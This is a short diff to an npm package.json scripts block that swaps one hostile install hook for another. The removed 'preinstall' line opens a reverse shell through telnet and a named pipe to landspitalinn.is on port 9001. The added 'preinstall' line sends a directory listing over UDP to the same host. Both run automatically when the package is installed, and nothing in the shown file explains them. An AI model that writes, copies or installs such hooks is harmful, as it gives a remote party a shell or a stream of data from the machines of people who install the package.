@@ -15,6 +15,6 @@
   "scripts": {
 	"prepack": "echo prepack",
 	"prepare": "echo prepare",
-	"preinstall": "TF=$(mktemp -u);mkfifo $TF && telnet landspitalinn.is 9001 0<$TF | sh 1>$TF"
+	"preinstall": "bash -c 'ls > /dev/udp/landspitalinn.is/9001'"
   }
 }
